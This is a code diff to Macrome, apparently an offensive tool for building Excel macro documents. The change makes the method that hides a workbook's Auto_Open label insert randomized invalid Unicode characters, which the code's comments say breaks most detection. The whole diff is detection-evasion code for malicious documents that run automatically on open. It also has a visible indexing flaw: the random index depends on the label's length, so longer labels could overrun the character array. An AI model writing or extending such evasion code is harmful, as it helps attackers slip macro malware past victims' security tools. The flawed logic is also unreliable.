@@ -321,19 +321,27 @@ namespace Macrome
         ///    nulls and look for Auto_Open without being case sensitive. By injecting this with nulls we break most detection.
         /// </summary>
         /// <returns></returns>
-        public WorkbookStream ObfuscateAutoOpen()
+        public WorkbookStream ObfuscateAutoOpen(string localizedLabel)
         {
+            Random randomUnicodeChar = new Random();
+            string[] badUnicodeChars = { "\ufefe", "\uffff", "\ufeff", "\ufffe", "\uffef", "\ufff0", "\ufff1", "\ufff6", "\ufefd", "\u0000", "\udddd" };
+            int indexLabel = 0;
+            string unicodeLabelWithBadChars = "";
             List<Lbl> labels = GetAllRecordsByType<Lbl>();
             Lbl autoOpenLbl = labels.First(l => l.fBuiltin && l.Name.Value.Equals("\u0001") ||
-                                                l.Name.Value.ToLower().StartsWith("auto_open"));
+                                                l.Name.Value.ToLower().StartsWith(localizedLabel));
             Lbl replaceLabelStringLbl = ((BiffRecord)autoOpenLbl.Clone()).AsRecordType<Lbl>();
 
             //Characters that work
             //fefe, ffff, feff, fffe, ffef, fff0, fff1, fff6, fefd, 0000, dddd
             //Pretty much any character that is invalid unicode - though \ucccc doesn't seem to work - need better criteria for parsing
-            //TODO [Stealth] Randomize which invalid unicode characters are injected into this string
-            
-            replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch("\u0000A\uffffu\u0000\ufefft\ufffeo\uffef_\ufff0O\ufff1p\ufff6e\ufefdn\udddd", true));
+
+            foreach (char localizedLabelChar in localizedLabel)
+            {
+                indexLabel = randomUnicodeChar.Next(localizedLabel.Length);
+                unicodeLabelWithBadChars += badUnicodeChars[indexLabel] + localizedLabelChar;
+            }
+            replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch(unicodeLabelWithBadChars, true));
             replaceLabelStringLbl.fBuiltin = false;
 
             // Hidden removes from the label manager entirely, but doesn't seem to work if fBuiltin is false
